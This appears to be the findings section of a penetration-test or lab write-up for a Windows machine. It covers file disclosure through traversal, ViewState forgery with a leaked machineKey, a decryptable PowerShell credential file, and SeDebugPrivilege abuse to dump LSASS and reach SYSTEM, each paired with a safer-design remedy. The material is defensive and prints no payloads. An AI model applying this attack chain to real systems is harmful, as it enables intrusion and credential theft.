**Evidence:** The user-supplied hidden `file` value was passed to `Response.TransmitFile` after a narrow regex replacement. Windows backslash traversal retrieved local application files.

**Impact:** Arbitrary application-file disclosure; chained exposure of cryptographic configuration.

**Safer design:** Use server-side IDs mapped to explicit allowed files, canonicalize paths, and verify the final resolved path remains within an intended directory. Never trust a hidden HTML field as an authorization or filename boundary.

#### Finding B - Static `machineKey` compromised via configuration disclosure

**Evidence:** Leaked `web.config` exposed validation and decryption material. A forged ViewState achieved remote command execution.

**Impact:** Loss of trusted state integrity and a code-execution path through a compatible deserialization gadget.

**Safer design:** Protect configuration files, rotate keys if exposed, avoid risky state deserialization patterns, and enforce application isolation and least privilege. Strong cryptography does not help if its signing secrets are retrievable.

#### Finding C - Decryptable PowerShell credential artifact

**Evidence:** `connection.xml` in the compromised user's Documents directory could be imported under that user's DPAPI context, exposing `alaading`'s password.

**Impact:** Expansion from the web-service identity to a more privileged remote-management account.

**Safer design:** Avoid persistent exported credentials unless strictly necessary, restrict filesystem access, use narrowly scoped managed identities or appropriately protected secret stores, and reduce account privilege and service exposure.

#### Finding D - SeDebugPrivilege assigned to a remotely accessible account

**Evidence:** `POV\alaading`, accessible over WinRM, had `SeDebugPrivilege`; once enabled, LSASS dumping and ultimately SYSTEM-context Meterpreter migration succeeded.

**Impact:** Local privilege escalation to the highest Windows local security context.

**Safer design:** Grant `SeDebugPrivilege` only to explicitly trusted administrative/debug roles, review user-rights assignments, minimize interactive/remoting access, apply supported process protection and endpoint controls, and monitor unusual cross-process access and code injection.

---
